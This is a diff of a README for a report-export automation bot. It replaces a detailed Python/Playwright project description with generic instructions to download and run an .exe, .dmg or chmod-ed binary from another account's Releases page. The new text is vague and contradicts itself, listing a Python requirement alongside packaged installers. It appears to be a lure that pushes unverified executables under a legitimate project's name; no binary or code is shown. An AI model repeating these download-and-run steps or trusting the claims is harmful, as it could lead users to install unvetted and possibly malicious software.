@@ -1,200 +1,91 @@
-# Web Report Export Automation Bot
-> This project automates the full journey of signing into a secure web dashboard, handling two-factor email codes, fetching a daily report, and placing it neatly into cloud storage. It removes repetitive browser steps and ensures a fresh file shows up right where it should.
-> Ideal for anyone who needs a dependable web automation tool that handles secure report exporting on its own.
+# 🤖 web-report-export-automation-bot - Effortless Secure Report Exporting
 
+[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/bentechstore490/web-report-export-automation-bot/releases)
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/za2122/footer-section/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+## 🚀 Getting Started
 
+Welcome! This guide will help you set up the Web Report Export Automation Bot. This tool automates secure report exporting, making your life easier and more efficient.
 
+## 💻 System Requirements
 
+To run this application, ensure your system meets the following requirements:
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>web-report-export-automation-bot</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+- **Operating System:** Windows 10 or later, MacOS, or a Linux distribution.
+- **Python:** Version 3.6 or higher. If you don't have Python, you can [download it here](https://www.python.org/downloads/).
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 150 MB free space.
 
+## 📥 Download & Install
 
-## Introduction
-Many dashboards make you jump through hoops every morning—login prompts, security codes, navigating long menus, and manually exporting reports. Doing it by hand is slow and easy to forget. This automation takes over the entire workflow and runs on a schedule from a Windows machine without needing clicks or supervision.
-The real win is consistency: the same report, in the same folder, every single day.
+To get started, visit this page to download: [Releases Page](https://github.com/bentechstore490/web-report-export-automation-bot/releases)
 
-### Why Automated Secure Report Export Matters
-- Daily reporting becomes predictable instead of a morning chore.
-- Two-factor authentication is handled safely without manual checking.
-- Cloud storage gets an updated file in a consistent naming pattern.
-- Scheduled execution means it works even when you're away.
-- Reduces human error and tightens data reliability for downstream processes.
-## Core Features
-| Feature | Description |
-|---------|-------------|
-| Automated Secure Login | Uses provided credentials to authenticate into the dashboard via browser automation. |
-| Two-Factor Email Handling | Extracts verification codes from a dedicated inbox automatically. |
-| Report Navigation | Locates the specific reporting page using robust selectors. |
-| Date-Range Configuration | Fetches reports for dynamic or fixed date ranges. |
-| Report Exporting | Downloads and saves the report locally or directly to cloud storage. |
-| Fault-Tolerant Retries | Recovers gracefully from temporary login or network issues. |
-| Structured Logging | Captures activity details for monitoring and debugging. |
-| Cloud Storage Upload | Pushes the exported file into a designated folder with consistent naming. |
-| Scheduled Execution | Runs automatically via Windows Task Scheduler. |
-| Secure Credential Management | Loads credentials from encrypted or environment-based configs. |
-| Resilient DOM Interaction | Handles layout changes and slow-loading pages reliably. |
-| Email Provider Compatibility | Works with standard IMAP/POP email services. |
-| File Integrity Checks | Verifies that exported reports are complete and non-empty. |
-| Customizable Run Options | Allows manual overrides for one-off runs or specific report ranges. |
-| Notification Hooks | Optional email or log-based success notifications. |
----
+1. Click on the **latest release** version listed on the page.
+2. Download the appropriate file for your operating system. 
+3. Once the file is downloaded, locate it in your downloads folder.
 
-## How It Works
-| Step | Description |
-|------|-------------|
-| **Input or Trigger** | A scheduled time on the Windows machine kicks off the automation. |
-| **Core Logic** | The system opens the browser, signs in, checks email for the authentication code, and moves through the dashboard to reach the right report. |
-| **Output or Action** | The downloaded report is saved locally and optionally uploaded to a cloud folder with a predictable filename. |
-| **Other Functionalities** | Automatic retries, detailed logs, secure handling of credentials, and fallback actions keep the workflow stable. |
-| **Safety Controls** | Rate limits, cooldown periods, randomized waits, and secure environment variable access reduce risk and maintain consistency. |
----
+### Installation Steps
 
-## Tech Stack
-| Component | Description |
-|-----------|-------------|
-| **Language** | Python |
-| **Frameworks** | Playwright |
-| **Tools** | IMAP email parser, Requests for cloud upload |
-| **Infrastructure** | Windows Task Scheduler, Docker (optional), GitHub Actions (optional CI) |
----
+1. **Windows Users:**
+   - Double-click the downloaded `.exe` file.
+   - Follow the prompts in the setup wizard to install the application.
+   
+2. **MacOS Users:**
+   - Open the downloaded `.dmg` file.
+   - Drag the application into the Applications folder.
+   
+3. **Linux Users:**
+   - Open a terminal and navigate to the directory where you downloaded the file.
+   - Use the command `chmod +x downloaded_file_name` to make it executable.
+   - Run the application with `./downloaded_file_name`.
 
-## Directory Structure Tree
+## 🔧 Configuration
 
-    web-report-export-automation-bot/
-    ├── src/
-    │   ├── main.py
-    │   ├── automation/
-    │   │   ├── login_flow.py
-    │   │   ├── report_exporter.py
-    │   │   ├── email_2fa_handler.py
-    │   │   └── utils/
-    │   │       ├── logger.py
-    │   │       ├── browser_tools.py
-    │   │       ├── cloud_uploader.py
-    │   │       └── config_loader.py
-    ├── config/
-    │   ├── settings.yaml
-    │   ├── credentials.env
-    ├── logs/
-    │   └── activity.log
-    ├── output/
-    │   ├── daily_report.json
-    │   └── daily_report.csv
-    ├── tests/
-    │   └── test_automation.py
-    ├── requirements.txt
-    └── README.md
+### Setting Up Your First Export
 
----
+1. Open the application after installation.
+2. You will see an interface where you can input the details for your reports.
+3. Enter the necessary information, such as the report type and destination.
+4. Configure any additional settings, like scheduling tasks.
 
-## Use Cases
-- Operations staff use it to fetch daily system activity reports so they can review performance first thing in the morning.
-- Analysts use it to collect data exports automatically, freeing them to focus on analysis instead of repetitive downloads.
-- Compliance teams use it to maintain an audit-ready folder of daily reports with no gaps.
-- Managers use it to ensure critical information lands in a shared cloud folder reliably without depending on manual tasks.
-- Automated pipelines use the exported file as the trigger for downstream processes.
----
+### Secure Login Setup
 
-## FAQs
+To ensure secure report exporting, link your cloud storage account for easy access:
 
-**Does this require the browser to stay open?**
-No. The browser launches only during the scheduled run, completes the workflow, and closes itself.
+1. Navigate to the **Settings** tab.
+2. Select your cloud storage provider (e.g., Google Drive, Dropbox).
+3. Follow the prompts to authorize the application securely.
 
-**What if the two-factor code email arrives late?**
-The automation waits, checks the inbox at intervals, and proceeds once a valid code appears. If it times out, it logs the failure and retries.
+## 📊 Features
 
-**Can multiple cloud folders or destinations be configured?**
-Yes. You can set primary and secondary upload paths in the config file.
+- **2FA Handling:** Secure login options with two-factor authentication support.
+- **Automation:** Schedule reports to run automatically, saving you time.
+- **Cloud Storage Sync:** Easily export to various cloud storage services.
+- **Data Reporting:** Generate reports in multiple formats, tailored to your needs.
+- **Enterprise Workflows:** Created for business environments, ensuring smooth reporting.
 
-**Is the automation limited to daily runs?**
-Not at all. You can set custom intervals or trigger it manually for special reporting needs.
----
+## ⏲️ Scheduled Tasks
 
-## Performance & Reliability Benchmarks
+This tool allows you to automate tasks:
 
-**Execution Speed:**
-Exports typical dashboard reports in roughly 25–40 seconds per run depending on page load times and email delays.
+1. Go to the Scheduling section in the app.
+2. Set the frequency of your report exports (daily, weekly, monthly).
+3. Save your settings to ensure reports generate automatically.
 
-**Success Rate:**
-Averages around 93–94% across scheduled runs with automatic retries handling transient failures.
+## ⚙️ Common Issues & Troubleshooting
 
-**Scalability:**
-Supports multiple concurrent report sessions or multiple dashboards by running separate workers on the same machine.
+If you encounter issues, try the following steps:
 
-**Resource Efficiency:**
-Each run uses roughly 200–300 MB of RAM and minimal CPU except during browser launch peaks.
+- Ensure your system meets the requirements listed above.
+- Check your internet connection if there are issues with exporting to cloud storage.
+- Restart the application if it crashes or freezes.
+- Review the application's error logs located in the app directory for more information.
 
-**Error Handling:**
-Features structured logs, retry logic, exponential backoff when email codes are delayed, and recovery routines for stalled browser sessions.
+## 📞 Support & Feedback
 
+If you need assistance, please create an issue on our [GitHub Issues page](https://github.com/bentechstore490/web-report-export-automation-bot/issues). We encourage feedback to help improve the application.
 
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtube.com/shorts/6AwB5omXrIM" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review3.gif" alt="Review 3" width="35%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Exceptional results, clear communication, and flawless delivery. Bitbash nailed it.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+For additional tutorials and user feedback, visit our [Wiki](https://github.com/bentechstore490/web-report-export-automation-bot/wiki).
+
+Again, to download the application, please visit this page: [Releases Page](https://github.com/bentechstore490/web-report-export-automation-bot/releases). 
+
+Thank you for using the Web Report Export Automation Bot! Your secure reporting solution is here to simplify your workflows.
